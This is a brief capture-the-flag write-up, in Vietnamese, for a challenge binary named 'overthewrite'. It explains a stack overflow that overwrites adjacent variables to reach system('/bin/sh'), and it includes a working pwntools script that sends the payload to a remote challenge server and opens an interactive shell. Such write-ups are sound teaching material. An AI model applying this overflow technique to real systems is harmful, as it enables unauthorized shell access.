**1. Find bug**
- ![image](https://user-images.githubusercontent.com/113702087/212821567-1c1f19e6-e2ef-42b9-92f7-8366065431b8.png)
- Dễ thấy bug là overflow khi buf có 32 byte (int_64 * 4) nhưng lại được nhập 0x50 byte
- Dựa theo chú thích của ida ta thấy buf cách s1 0x20 byte, s1 cách v7 0x18 byte, v7 cách v8 8 byte và v9 cách v8 0xc byte
- Ta sẽ overflow buf để control cách biến s1, v7, v8, v9 để thực thi system("/bin/sh")

**2. Exploit**
```
from pwn import *

exe = context.binary = ELF('./overthewrite', checksec=False)

# r = exe.process()
# gdb.attach(r)

r = remote('159.89.197.210', 9992)

payload = b'a'*(32) + b'Welcome to KCSC'.ljust(16, b'\x00') + p64(0x215241104735F10F) + p64(0xDEADBEEFCAFEBABE) + b'aaaa' + p64(322376503)

r.sendlineafter(b'Key: ', payload)

r.interactive()
```
- ![image](https://user-images.githubusercontent.com/113702087/212824153-53f31381-bd5b-4945-8945-5ae04b266ea8.png)
